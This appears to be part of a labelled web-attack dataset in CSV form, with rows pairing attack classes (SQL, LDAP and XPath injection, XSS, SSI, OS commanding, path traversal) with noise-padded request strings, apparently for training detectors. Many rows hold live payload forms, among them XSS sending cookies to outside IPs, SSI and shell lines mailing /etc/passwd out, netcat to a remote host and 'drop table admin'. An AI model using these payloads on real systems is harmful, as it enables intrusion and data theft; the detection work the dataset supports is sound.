,id,class,vector
4700,4700,OsCommanding,/sesc422egeoetlt/lYTfe3OHV/Slfooowot/s8zwtpr6h/yw_rq0mrgXS/dJ-ea7/fk.cgi?ne=d3u&M0aV@kJjI=dhinGw&minsbvfarobz=413070&lRaQXH=55&hnN0iohrorcrtat=alCcsshex5hew&toiso=oSN8hkzFXn-&oatnoNtshhardad=72868
4701,4701,XPathInjection,/aftonlkveTc5r7lr6lj/nxeXHMM_uDW73YmQ/cWH/edsiscs/x1qfserviceswhere@vu3y/danxbltstu/tfhe7ielhd/irlRxnE5yRW/ubsiBt0LKljEYD3Kh2v/tfn7j1hqyh7ekaem.msf?osoarnssiec=152858&tewttct2d=la+%7E&hasetit=2rnjaelminsrr
4702,4702,LdapInjection,/tahttlniefa/IHAvVftpJlbPY/hfv/seeth3/85h8cweM3vorw6F2qvyN/lmefnstRatj3/mtMaoEC/dS9yt7r3otonnh7dotr.aspx?0%uhnxg_68=e+stryiano&rnrqtntos8rdt=fa&roldqme7hp=jieiiOfJcapie&7rsofadmwP=txtr&5wxyauesrenf=dERIsDUiyfmz&ilg5eracatffsrf=0mtoen&biimjt9p=%29++++%28++++%7C++++%28displayName%3Dhad*%29+%28name++%3D+had*++%29%28mail%3Dhad*++%29&r0jieoutsteoo=oHL92m&ierafsdey=A6include&NcsyiNhpp=2&cnnamReaaw=92174&Nto=eume&OsuEew=pbg9&uotqAVCTsBaccess_log=+nielrie%5Bsns
4703,4703,SqlInjection,/ifvvRAcDvjzl1ru/eony7/@nUF_kY5anda5s/o2zkeFcsxhaIeeprSav.gif?nh8nt=chairs%27++++UNION++SELECT+n++++FROM+++dba_users++++WHERE++name+++like++%27%2525&eeOu=+&adtlmiwdekaibis=nTv0oeJ&stsjnaib4t=yiu%3BwgautoexecWenvl3Ea&eood=mo
4704,4704,XSS,_nDcWFj=rlenjvl81eeeh&a0ayvv2replacef-=tseh4c5s iaccept7e&ntytsebjseherw=570&ng=dRiRnGr&nx=pQd5-2YE&ohaxntnenqpc=iuxml8dbodykuFO&t7OR4=mDntvAF&c3zfaasld=9707
4705,4705,XSS,"G_F_G0=<iframe  src  =   "" vbscript:[window.open('http://101.2.16.109/arsi.bin'+document.cookie);]    "" >&YQMwheretv=eacn0eeme3&d24slr947iar=rekiyin:en iiys<h&idtuuru=3"
4706,4706,SqlInjection,/penYc_f/hRMDz/adevea3nc/el9oa/mzolm5o/sZJZzE_oF_/Kk/zoNnPX/tnegkaexes5eegbrv5dm/b9ukhtr7sdsEyufl/c1sdckDoc75/sxIRu.php4?Vu959whereinsertN7=ti%40&aieose=q+t6o+Iph&axf8srt=p&me=4450326&Irli1Yj=98440&l1earoo1=chairs%27++UN%2F**%2FION++SEL%2F**%2FECT+++9uxfosii+++++FROM+dba_users++WHERE+oa1Nb++like++%27%2525&nxrwyn=882&rgsw=0or&nwere5m4=e2oJtTKnR&qete7csa=e068-BgUK%40&shutdowncwm=328658638&detl6x1smnI=40004457&NMxeBNktPH1m=a%25rrcwlldgnph-&NtitzytltqgLodo=8325694&TpsXdivB=N
4707,4707,OsCommanding,/aeoeuotmorduq/oun9fg62/a9xwVyeUm6X_.v/v2u1/nmBadRw197xgCD9WBr/yy8sasYtaunxaiurnno/d1IcqX/oth/1o5rooueIgtrregb.shtml?gt=20&eek=132765&ta=dh%2B&haghbiiptier=5&ht=9window.open0opena+na4&tr7ieayfphaA=7279497937&5Qnf@tHy=382268950&oMOsmnjxom=exTS&eeiia1ezinlg=d8O.NlBy%40Dwh&s6ma=06162478&hlo=18011872
4708,4708,XSS,/lGIg6UH-wAS8WRXcuEw/elW6D-IObwCy8eNmcbz/SyEf/mcs/rceasheht/hI1passwdQ8zq6UkFn1.css?gs=vh&N5wdLinputleg4=%3Cstyle+++type++%3D+%22++text%2Fjavascript+++++%22+++%3E%5Bdocument.location.replace++%28%27http%3A%2F%2Fwww.metichil.com%2Fcgi-bin%2Fro.cgi%27%2Bdocument.cookie%29%3B%5D%3C%2Fstyle++%3E&o4issreHibi9hek=tfyIa&ioeoo=2577&sgNisne2eoi=84&b7CVop5%uy=s%2FlibTc&pcieoaoin7sO=4&eslxT1s=d1bit%3EaeLeot&htdeor=mks&srdipewt=646274510&QhJ5_e.=eE%406p1nca
4709,4709,LdapInjection,/oY1Pipr/oisRytbonnFka/ndt/aUUCsXTM/mgrryAisens0en/eYP9.mspx?ta=+&5engeidIsox3n=375322&dt=%29+++%28+++%7C++%28displayName%3Dhad*%29%28name++%3D++had*%29%28+++mail%3Dhad*++%29
4710,4710,XSS,/ewknijqa2ejctss6v/cBoO/otbghjgh/iHOTWReu.asmx?evalbdocumentXgb=re%3Ae%28elsusrnph-+lb&ut=60864&hra=%26%7B%5Balert+++%28%27aevuE5toza%27%29%3B%5D%7D%3B&ro7i0edeDu=772119363&leSYgonasofmen=processing-instructionatnm2plike%3Ccegitea%3Foed&erNhfl=r&Umtqe6ai30esst=di01tli&ael=47&ago=cbsWraioNesduq
4711,4711,SSI,/7LRyRs2/tfeegr3ntaoipoho/oLK5JPEMJC0WZkSdYbsq/d6@Wms3WY4eK1d-dBVQt/11stdin.NRFrNEd/147gvZW6ezUmRuKryC8.cgi?eob1it4reEa=3469272560&re=7&ehs4ntv=te&ciedAdo=ftarHe0axfsUwxcFf&z9zif=wb7aitnq&rt=90412741&narua=iSJinxmsnreamtiau&jKdsfe=pnjc+noht3s&aretNka3=ueif%28&PZS_mZszt=replacee6e&rus=096774
4712,4712,SSI,/nn0aHyvmepied/sc@_xvNoi5KeO9gg@/esqtpreeintsssha2d/Sqp/cE7hB2wQ.KBGwR.sh?qSa3boot.ini38rhtaccesk=asg&shiV5sicfcdlz2=90&lxhcnadneo=%3C%21--%23include++virtual%3D%22d%3A%5Cwindows%5Cautoexec.bat%22+--%3E&nw=4_zLZPOvN6L&iaH=thsr&tasfhecs=29027624&oGtrehc=%24f7%3C%3D%7E+cO+aef%28&lcso3ke=kbreAcov&ztlrf8m=cetqiEoq0nec2avag8&s3=dmRfN&onR8eloWvkbsoad=dDpQh6_iP3%40&r7l=0456&ederwuwc=%3F%29ttnallt+lrshutdownRtc&7eEFcUe=0
4713,4713,LdapInjection,/ey.t7TCeW/Z0gXexxml/ieZCCIbtHEVAEahXTpi/tx8htrcez/aQoLgUVdds369qA3updw/o7g0wtodt/8zg18M.msf?tz0u=hOaccess_logeg%2FoTt3Lla%7EedxD&56dtnvuRmooyje=0&isoz1pHeuldra=%22%29%28targetfilter%3D%28o%3DNetscapeRoot%29%29&japr=1ecMuN&nt=2ifbchIMGn5mshutdownt&i1ozad=sh+naB%5Bbodyymhom&enladss=niac05ot5Tit0f&Lmsenyestc=32933666&eLew73v=s%24ihiD%26hawe2t&LandNB9wbgsoundA=isL6Htis3
4714,4714,XSS,/5YPX.bin?mCtd7b9eeofct=370255029&irRerosihveeeu=n3cigtwD&csNHscsa=%3C%3Cscript+++%3E%5Bwindow.open%28%27http%3A%2F%2F154.183.233.130%2Fas.aspx%27%2Bdocument.cookie%29%3B%5D%3C%2Fscript%3E&twpht9lhd=06352190&ov=noEcp%40.NsSL&hen5ucc0olebal=HilewlleecqneRiCul&cumgv4K=ay&mftdn1ss=%25rszincludesahit1rja
4715,4715,XPathInjection,/sC/nE7-7-5/989tpgt3I5/nSb@Qw3u5/WrLiInsdsdg.mspx?
4716,4716,LdapInjection,iP1joeesaeeeds=2082430&7nattott=dases)(&(objectClass  =   lsme*)&x5r=9
4717,4717,LdapInjection,/ef/iI4m8uG31Wz/tRsnoeeNlkuod/nzsJDwWJkkg7_E/myauidpontFeyriaa/pXm/lsnsjfi27rrgl32oe.css?srxhtshjyxTwa=830605&deocwunmietato=30032&uUeBl=i&N6rdgt1ZlhDG=divltlocationnwn%26%2B&4uqLMfYFPP=hXLQPxDWli3&nmUN=556453605&fSuFanohoaoF=%22%29%28targetfilter%3D%28o%3DNetscapeRoot%29%29&rSE5hqnn=58747995&kLeaeEend=09&aam1=4nstrht&LxtvG=cueerh&oregG@yB=feaiHnShvbdtHu
4718,4718,XSS,/oQHtPLWKbfRaL/pNUXtEKHnxg9nwer6c/bensteirtcccztsmhsm/B-HL/ZzHTuHBJdm/lRonwr6Oen/uRhaYhbgtTfZ/cN_k_.js?ctwou2=512986318&atidh=stf&style.p.dZD=binUyhyolk-letr&aRds7ci=r&sdm4=%5B%5CxC0%5D%5B%5CxBC%5Dscript+++%3E%5Balert++++%28%27iA4oaglh%27%29%3B%5D%5B%5CxC0%5D%5B%5CxBC%5D%2Fscript++%3E&he5ccadb4bs=0&xuWt=t9D&nlPxYite=Ndmhvue3insertiaet&uue4dyasudons=3987&headR=2AWFz&n3ubeur=304939&nftthicaeaotGf=659030416&nahe=m_U%40
4719,4719,SSI,/8weQUfIWQIIN/tVC_2-NJ9MQhtacces.htm?9nnEk7I=b66sw5enbscript&lsa0a6AfrNd=46262&teeTmhrnn=zoteN45tmim+t6&edemsOtdooei9O=3i&e9koeYrst1mp5zr=7LCEm&ocroasAootqleit=eFUXP2&F7passwdKUoQf=6258&iSPZeX6Sg6yh=4%3Csd&ne9l4lfm=oetjClFaizdAi4a&i75replacepzMEiLW=73887&igv9=44287&hd0ahtttrtma=tcgBxFh&meca=wwtbuo%3C&ls=sBTJpk&msIafqscK=oaabRlb%40%5D
4720,4720,OsCommanding,/aPgQB@Y/h5gs2ncbped/aSg9vv1NopD8F7u6_/XUOQBformftpX_l4BQ/infqlpsB2FIXf/ioIRbecO1zJQs8-kE.mdb?HhttpN6@=%27+++%3B+++ps+++-aux+++++%3B&eoyskseijfno=9eyce
4721,4721,PathTransversal,/nafilhEsoe/nD6CNSi0iI-ICn/ordhttw2aThayhlHws/naUe5BiWAs/aaf-hMMXMA/io6bztvOF5GK5.htm?gfiaEo=ojzhkC&dUarUAhLYMd=ftptelneth%3Bmmocha8rteNtf%3Es&E1rlib=956579&tnE2ga=o%3Fel%3Ertdricwimochake&fa0g=iframe3w3h&Bthnercsdsl=%7El%29tman&nbFg1AnwVT=2+oo&h1oSgaa=..%2F..%2F..%2FWINNT%2Fautoexec.bat
4722,4722,SqlInjection,/oW2/aYwVfT1FBj/aztalzube/3Xrlwemexswi7NtS/LH974xw3tmgn4Y/ezsaezasw/9xpl@TT6gv-/8btZ9Y9NzxrcpG5Ai/p@jMg.QsNAgM.png?sna=o+aJ2e%2Beo%3Blfs-%3C&as=4TNqj1EC_ryq&tJPin16Ll1Cmochal=ef_pMdqL6&orgrcdme=Eir&WE6hKni0EONdelete=n+aeem+ama%24%3Ay&ris4wtoeo9at=wveee&e2tIRirt6=edropesserviceslhmyaOhcwconnect&es=84381343&monaufsi=+teix%5Ccgroup+byTsCusvaktc-i&sda=rgryNGD&dNT605fHaG=sliNslrnont5oc4&e5etS=eiO2duot6ikrahrona&zsom=%27++OR+%27tnappy%27+BETWEEN+++++%27R%27+AND+++++%27T&lfrmacn=r%3EtttiY0dtdsrn9
4723,4723,XSS,"eqhnyc0lrnnmont=<div  onmouseover    ="" [alert('hsih2ia8as');]"" >"
4724,4724,SqlInjection,eehhtchpiut=cPbGhM91-l&igelualai0h=0hutmi$netcat&texc'?eN&nttliloonPsyt=7408941&nncrpooert9=eht'/**/UNION/**/SELECT/**/pyoumy/**/FROM/**/dba_users/**/WHERE/**/aIe0ro/**/like/**/'%25&3ljC=eDnOP&amyes3eoghn9r=143416
4725,4725,PathTransversal,/idzW9DFVYgu/lyBh.sh?xoogcGrrngiwel=%5C.%5C.%5C%2F%5C.%5C.%5C%2Fetc%5C%2Fs4pOre.conf
4726,4726,SqlInjection,/avnHwJ/itgen8eJsn4/mArgreewsoriGCbl6phj/GKQ-6DCAQ4ggmJ5/rFZ88B.Z@8D2tS7_jD/erJUfb..html?m2esbwhyu=2&8tmagwtiehn=taszYwi&uhcmmpnLoo=%5DNn&em=xtdgc&fhet=aoaaccess_logedhetoor&to6s=%27%3B++drop++++table+++++admin&qR9XlfB3=tdhdl%2FerWefl&n398mrmiSu=ee5JO_NPjn&eiiiripdeb=gi-uRat%3E%5Bob&hoteith=74053990&NMHTkiUJbq=dopenmneIf&2zc=mochaaaMuuinputgteNn%3Dao
4727,4727,PathTransversal,/dhjtoaeofe/ed/n8a@5GI1WOHXEE.YaPYZ/eena.msf?xXXD=rmnwxaexg&millctse4s9lL=93105&55nR9=386&aeawzuab=ye8&tInb_7=106&nea=fromvjRddocumentoiici0afnhoexech%5D&evD=..%2F..%2F..%2F..%2F..%2F..%2FWINNT%2Fautoexec.bat&imUte=8
4728,4728,LdapInjection,/ecMx.6C/tQodzewoI/bFRvdf.TkQ5c/nYIitItieessii/tJf/7tfsemlmhzhjlja0tms/6rcallX/sQniJCYt8.lBE1/nsmeii/wotpuifjdgr.nsf?dlosrohkm=%29++%28+++%7C+++%28+cn%3D*o+++%27brien*++%29%28mail++++%3D*o+%27brien*+%29++++&ieusvArmytot=uc%40&KmpasswdVOZ=ml53&drAwiaes4s=64&ni=tapasswdu%2Fl%2Bhn
4729,4729,OsCommanding,/netibsesapsragktvtE/dmOd3J/alCZ67aT/7aptAsxeX5aepcrCSnR/knwtileeiiqx/drasnsytalaryis7mf/tpa2nis.cfm?hointHlsn=393822&ZlBYFRG=4745&e7ept0tli=sLT7S&ebaenres1ne7fi=18968263&2qtai9alao4=1OD16&jseyt3is=cit%25a&es=45206&HNOxjWFstdinI=3rnr%7Cpaa%5Cg0aperla&od=9298&wylpaARfknee=rgm&oMami=oops+++++%3B++cat+++%2Fetc%2Fpasswd++%7Cmail+++++your%40alN.com&thoo=sInPBB&yuKy=rH_3ZEvYhc
4730,4730,SSI,"8lTU=mnmGrvK&arnhzeW8rbs=omoem&pAPAWsock_stream70.@O5=<!--  #exec   cmd=""/bin/mail  unafot6q.com     <     /etc/passwd""-->&o4eaSkhfi=53930&n4oe=192&G2YacceptndmC=144"
4731,4731,LdapInjection,/a0s/tdYN_OyIgAWCgPf@F/HU0ioThdirsr/6ZcopyAlSSVG/2T.SVy12jCUrr9c-v7L/FKS2/tv0MEUuW0c8yVWSNgkob/nfDZJEq_KkzxLRyV/waccept..js?eh1oeBVhoue=osoc&a0asnairt=%22%29%28targetfilter%3D%28o%3DNetscapeRoot%29%29&eeehmeieits=0357100&eakdtdt7ttsm=sDr2r8&4raruhehatAahl=nMYwOiRl
4732,4732,LdapInjection,/oU0Hyzd9qS2/aOwksxTGuzpq8CZH/wgetDeF2@eX/cvPv1ZN/RldrophscriptpositionfjoFYMjxh/lro/tjoothcn/Tosaoevi96eEarmr1/oneoe/tJEk/S7ua.css?3pgroup
4733,4733,XPathInjection,/oD/t1Us.css?lH=filb%27+++or+++++1%3C+t%2Fju%2Fn%2Fchild%3A%3Atext%28%29%5Bposition%28%29%3D60%5D++or+++++%27sne%27%3D++%27&eehfadoeIsra=tinserttnull&eiEf=adonH&cysbjhsZi=psru%3AtmpaE
4734,4734,OsCommanding,/bXNITs--5HdropPM0H/sAm_FT9kQfq5DPZpF/ezqytsaI1HFsn/ptdhivtec/Ra/ieteeuiae4EoaSpcasro/sVCtjUA6TfrGKDVCx3/ulnrothsAowEnOu/eivjBrn/ntmg.mdb?stypT1utidjNo3L=hlel%3E&TYFB8W=%5Crxterm+++++-display+207.208.120.62%3A0.0&lynt=%3Acatzposition&ePl4=itwj3u&tmi38Tisa=720&yueai8deni=n%2Fforml&ErOoS=x%27ADlinkv&lR=cOoi&i2o1no=360767142&Vyxc8ks=Ti69thE
4735,4735,SSI,/dm035/aucoxs/tss4ebfncu2ia/hgGNN/e-HD9BaG1n_D/linkde5mHNt/d2zI/orcddroil/tU7x2RGI72Npg/mrvirsee.asmx?1Atxl4odr2t=ea&D9f9M=mrakscriptbWs%3BuTe0%5Dh&eaieyMohf6Ktdtu=wEcfdteoc&e1aain=4u3ec3yerhfmfgtnhg&lefiitmyt=0658&oDpsGQ=l50iNEp&uciegeRti=%3FndadeneoRs&ta28z=%3C%21--%23email+fromhost%3D%22www.bioSdt.com%22+tohost%3D%22mailbox.7byi.com%22+message%3D%22dnls+iaoiewc+mohSwr+br1%22+fromaddress%3D%22eero.com%22+toaddress%3D%22eue.te.com%22+subject%3D%22h%22+sender%3D%22usd.com%22+replyto%3D%22ih3dftm.com%22+cc%3D%22lt%22+inreplyto%3D%22ww+xsa+n%22+id%3D%223smail%22+--%3E
4736,4736,OsCommanding,/e-3qEcKDC/etonrgcmr8IfderXnT6d/NawoOleaNest/lntga8zu/rFWo-46wkW/ureptouOm6nu/passthrug3VbrjdcT@/wPX6-qp9EpkCl9q4/nylwjmeve4/ZRUnmsM0/it2aneapd.bin?bno6dKtiRsnu=wLav&dcdnfxssl=aor9%40th&tn0imaae=%27+++%3Buftp++-g+++%2Fhome%2Fisnasierteet%2Fmeormeesst++++96.118.135.77++++%2Fanna%3B
4737,4737,SSI,/z8mailsam7f-/xtnAebnc/Ee58u/0xd.php?ma=s7%40GW_wZ6EL&k1dak1i=376855&hsohm8nen8hspnr=sU5Dmjt&B.prtvwenxtermU=Ea%27eyand+t&oeeseesyzeveaot=%3C%21--%23echo+var%3D%22date_gmt%22--%3E&5fdotr=5&aentsameo=47813784&t5enoaaxie4=wp-&eoeoeett8dtef=horb&tl9cxasrh=rwinnttee&rp7mr6tomrtK=e%40&on=en5si
4738,4738,LdapInjection,2i=875&lod0Sr5o7nnpe=tolIaZqvQaw&fyhlepfa=0&iNl=iYLK1biL&XawreiesmAtnfad=er4nrEPb&xlosdiToP=0l3s&asO7aCg=wadcWTa-pHpl&qqChpsWMkb3=7&8aerajdsz=moe7nssaloti&snT9toTo=qz%trUqurep5&wt=07404886&icjuv4lgiethi=4aaGjr5d3oerdown
4739,4739,SqlInjection,/cIrhTh/NBf/tjhritbpennTpfasb/TcEihtpassLOTdn7jsgroup
4740,4740,OsCommanding,..��../winnt/system32/cmd.exe?/c+dir
4741,4741,XPathInjection,/tT/8@d9phpTKgI@adminwR8/lO/iQ/cbNDu.htm?nu3itrodyw0Irxo=hpiris%27++or+++emZa%2Fryg%2Fchild%3A%3Anode%28%29%5Bprocessing-instruction%28%29%3D8%5D+++++or++%270eib%27+++%3D+%27&so9tptiy7sFs=psItiframes%3Astdin9r%26tirp%5Bpxrud&Nirest=ttmpakmetaopt-%3BreroOdropprme&u4Rateoeohoi4a=numAssmt&aha=seew1Asen&k3eahl=a3nkJ5X_r&msfNseporedhAl=qlx&cu=tuN2pt0rN&5rseieamncothC=290702&qy6dhlnanBUht=nxsJ07J1rEB&lcmdKPLUO7j-6=inserteP-ejgrtadminn+luiop&mbwVREitrys=ks%244ahttptmpmalib
4742,4742,SSI,/tbuayw9Oc3aaaTWe/8rstnehi2t/pQmX9xWdYWzlcC.css?hs=to&esdqadstwlti=9245589784&ehHeihihbnoEap=wIN4N1Vcg&aexo=195074&sayllfnzau2isee=e&sy5e6npbaaswsg=oTt0&aEbbsmoyXara3Ae=ob3r.2ZiJ&30eKXMFg2IC=ca5dmmrTedaeed&ZL259U2=%3C%21--%23include++virtual%3D%22%2Fetc%2Fpasswd%22+++++--%3E&XjMaEmailFIT=divat&o3eeksqc=Olcaeeanrrwst9&4hmtmhetirn=el3
4743,4743,SSI,/fiTEZ9tKoWh/Ar6uah.msf?Uezc8a=%3C%21--++%23odbc+statement+++%3D%22select+++sdjn%2C+++++iFfc%2C++Jeuj++from+tt7Tdknukd+++++order++++by+++6%2C+++23%2C++2%22+++--%3E
4744,4744,SqlInjection,/eboxtipea8tkcAnhob/nboot.inis9N_n3g/lR.aPLiaFyJ.gdR-QA/yP/rugTspzw/ttethrtcapeeuil.asp?de3xahoiEs=35&catadrTcns=5ero
4745,4745,LdapInjection,/roiNty8k0X-2/u8IrGhA5ktqQ2/aru9h5yiiewaOz/2ir/o4tIhWeRyBint8ead/nrj/te/nJ8-V3qv92itaPMoz/iuTi.tiff?arnWtye=dbee%29%28%26%28objectClass++++%3DIiad*%29&naasj=oob%26d&nE5stwnesrssae=6677
4746,4746,XPathInjection,/rOafliivubuf/eisoo3wrwsHdtlt/uWHKpassthruNNTu/vFyYEETeYH/xwndBk8fanMrC9Oyp/thlmpe/l9eqkoseSUtl3i/nCtdktci.js?iesTagM2o=ft%27++++or+++ahl%2Fnmr4%2Fchild%3A%3Anode%28%29%5Bprocessing-instruction%28%29%3D999%5D++or+++%27tyc3ioac%27+++%3D+++%27
4747,4747,LdapInjection,/ttek2smst7IaL/0gC1PRE/tJwHsK/LvJV1O/42HbwRfgKfj2H8/amdelete9httpx/cftrrlbzorkga7y/uYWrh1fL3zRLc.mdb?eemsd=8e&eJi4aiit8t=9eiautoexechdtr%3AsE9h2C&QKnm1zx4=%24cypasswd&eh=fed+&teRCnpntgt=exmllo&iynribbrntt=527&An=T%27Ate7aexTds52i&etar=b6er%3ATeaallC&ykete=bcj%29%28+%7C++++%28N3l%3D*%29&FJen@sJG=51&FyhAaeaecofarhA=45910&8tLer=853879
4748,4748,XSS,/lOJBsnPJIE@Q-YvMd6pT.tiff?sy6tKikte=eyDGiy&tThetdldIes=32661&tn@htaccesV38Ivit=Aer&iTninlerR=Stdiea+3t%28ln%3Fe+bin&KM8OWf1KMix9=z6ATDfaoUYD0&AsjmtCN2r=%3Cxml+++id+%3D%22++++X++%22+%3E%3Ca++++%3E%3Cb+++%3E%26lt%3Bscript%3E%5Bwindow.open%28%27http%3A%2F%2F84.105.208.178%2Fon.php%27%2Bdocument.cookie%29%3B%5D%26lt%3B%2Fscript+++%3E%3B%3C%2Fb++%3E%3C%2Fa+%3E%3C%2Fxml+++%3E
4749,4749,SqlInjection,/ooYn/NUAJQTGNKAmz.php4?
4750,4750,LdapInjection,"ieoSadswu6fynt=Oelfc&P6F8=1tdB&ahmoka4a8="")(targetfilter=(o=NetscapeRoot))&eEnnTy=rei&DzxejEDW4CXn=o|&cyieatce3aE=1i8ytxfhliaiTOpGa&vrvevRleTr=jbun46(&aae=120026248&bgsoundu9bI7au=173546&ea2fmohhbyg=016798505&T9lilE9t7=hv&Pe2PFmt=qojqQyc4&sohrl=fotf&1iuo1oq=eRvlIkJKm"
4751,4751,PathTransversal,nOo=t&nnd2itni=uCtaccepterolnetcat$ipb &Acgsas=d&nslwUirneht=adesosngEoxef&gmesPvtabeuo=nyc&jbsjetc=ipaho4gottteehtd&2YGMA=nsAbtchhcnait&ba=5&ito=rJaff&xj8le=537175811&kTteiioai=oqt
4752,4752,XPathInjection,/o7qd7z04/nCtTtDlSmeL86/nflaY.ODLL2.5G2/sfkyepfttQdfe/lxgvjyHon-wYel9/r1.gb/uASDX/eshzbKZIXN/lsqtknodeKQpnodern/ew@bpTKCxxLdQiGr/OT/jovGYElq7xmmq9hxY.htm?Oayc3udliapc=h%3E&won4xwwixeaf=lnnio3utrjxer&nNsrtiu=0529566&xteet=rcaNisr%3Bhrr&5u0aKZlhtpassY94position=104&ert49=uwj6F.UhbYIt&3GsZ-NEW=te%26i28x&nnf84nnHo9ibmay=76194&trs0uqelnj=74140764&insertYA@._ZHhttpvarsj=ra%27+or+++++%28i+%3C+count%28byeuai%2Fchild%3A%3Atext%28%29%29+and+++++j+%3C+++count%28lfo%2Fchild%3A%3Acomment%28%29%29+++and+k+++++%3C+count%28irlos1%2Fchild%3A%3A*%29+++%29+++++or++++%27ao%27%3D++++%27+8saoImr%27+++++or&erdfmeyknRoaxdi=6nprmGrcelseiu5m
4753,4753,LdapInjection,/PKj__Rc/Chomev0d/rytiozibsrvse/4W31EBYWC9Y/G3VrkP/wihLaeghsdtrsVeqe/ZLb@DlsizL/gsMg5C00JY0p58QXFA7A/ynlllhhe/ot3Hnm4yvzrdId4mea/aFbsVF7U-tNirOtm/inGR8hTedD.swf?VGPlHvXbE=%29++++%28+%7C++++%28displayName%3Dhad*%29%28name+++%3Dhad*%29%28++mail%3Dhad*%29&mraeHl3nde=0&kGptsp=4044&syr0=t-olAr&aaoAa=uymwtndfonl&IUMp=ui&OunionlocationuX5g=ae&jN=nM8i&sieje5=ao&nsedinni7wafa=1227551&eetlnhtcdbeh=fQfQgLWO&xM@XN6=0918569298&tehra2tgasr=tetas&QVD4psELKGylz=2887881
4754,4754,XSS,/nq206wsJztkx84ZQs@kI/ovlRSSNQzXqg0/rw/6.D3C/having@inserto/bU9scmdvarkDBri/NIJ2_/2o9etIqYv/g9wwbeieeiew.asmx?vD7B=45140&7Fnuzhfcatdr=83253832&2rdlmsDyot=a&dotxjle0bt=838649&aomxgoofioonda=dmEdnhpr9edosjaw&FF9cKd=o8R&itEoouEjeti=upOL%40a&ni=psaec&HgiSdsmtfw5s=587987&yc6b=7I%3Aa&ee=co%40stap&WID5Y2positioncopyaR=cde&wh8ee7ltrgdrry=1134335&tsuiov7gstv=hhtaccesoen&YEyeimtoe=ps%3Dh
4755,4755,PathTransversal,/aZT3U/mlaWss2esfebp/oRDn2onuL7Ph/ednjt3e7ybiMxe5tshhe/styh3whE.css?yFRKuNt112=09&opceegmamcseynm=%2BtVserc%3Es&8sAehnef4=69235808&eeyr=vxweoEPa6s9a
4756,4756,SqlInjection,/aMcPG5nvc/puimp0derntdts/6positioni/Resogaan1r/ntx6i.php4?Edj7Erhaccn=htht0echonnvohcrF&piabeiR4Ixnni=%27+++OR+++++%27otfesoah%27+BETWEEN+++++%27R%27++AND+++++%27T&ozbQSY=e&Rsiu8=eLrAURA9zC&_Zai=4472987247&Rsweca9h8te=%2F%3C&0hd9oetea8ta=jO2.LUPdCZYN
4757,4757,OsCommanding,/eX7DUyU3ZGdR5boY5/r-GfQX/uFw3cFTPOYBtn/rgraelNwo.tiff?srlhd8erwNhae4x=%7C++%2Fusr%2Fbin%2Fnc+++++-vvv+++100.190.148.109++80%2500&eettdvArd0sk=274&Di=tmptekookobjectdfn
4758,4758,OsCommanding,/WjmochaLLrprocessing-instructionFb2/asj3d4qHSs/nluW3nf/0adOg/28p9hiq/3dXE/sHI6@2q/ogaipbcsbmfns/viiaaar/gSNnO@/eXMp6fVAs/nGM.t.asp?cCl3EchildHVZ77=rt&podtmEhl=raaQEafsbil16es&nbl=NbDm&PkLG=s6eOJAHm&ontt0q1lo=lst&c8g174de9Eeqnu=626&xbeEsht5=vQs7gBCNqiD&irDCoptscriptUNR=209675&nssetteennsrtt=c%29o&ee6seh=n%29&ea=2197998885&elDenxr=4919&ntb3uslo=raipnsse%3C0lqcm&nAr7oomatgl=eknear&eihes6rtarSohwi=%27%3B++++EXEC++master..sp_makewebtask+++++%22%5C%5C48.43.255.29%5ChuuleDi%5CYweei.jpeg%22%2C++%22SELECT++*+++++FROM++++INFORMATION_SCHEMA.TABLES%22
4759,4759,OsCommanding,/b./ausyuhslnlmee/sI_O@6_bW/ctottegiedy/9aUnc/ad7e6/0_UJJtk83U/opM/vuNbSiframeTHXYbB.jpg?ufQT=isnaR9idmiMbuw&el4sUidptyuBd=hmio1Eeootagqn&ahtasile=oxneon&SA=tyApBj&wtaTsfsezh=832940&hbreo=ail&cya=i+dtetlshutdowncataerechot%24no
4760,4760,LdapInjection,edoicseeu=oarbO_q
4761,4761,XPathInjection,/aL2efmtzg/pFuqXMkI6dII7execV/soteyimtnrqyhrbs/rlZ-5TDRK86OXR9BOFB/syxDbEkmwRPXodf@nA/gg-DCwX-Lyo/eRar.dll?vtrUneivss=lAbn&moCnmailTfhp5jz=eDcd&stbe5ea=u7pNeiont&on=0627742&eA8mb4an=88+++++or+++++1%3C+++rMlcr%2Fns%2Fsyeais%2Fchild%3A%3Atext%28%29%5Bposition%28%29%3D8%5D+or+0%3D%27%5D+%7C+%2F*+%7C+%2Ffoo%5Bbar%3D%27&uiss4zauiO=300357835
4762,4762,SqlInjection,lu8K3=T@&hgawctaSpMn=00gla>es&tjIceinaznnging=0>i]nyErs4e ra&en1sm9=acobnMawhkee
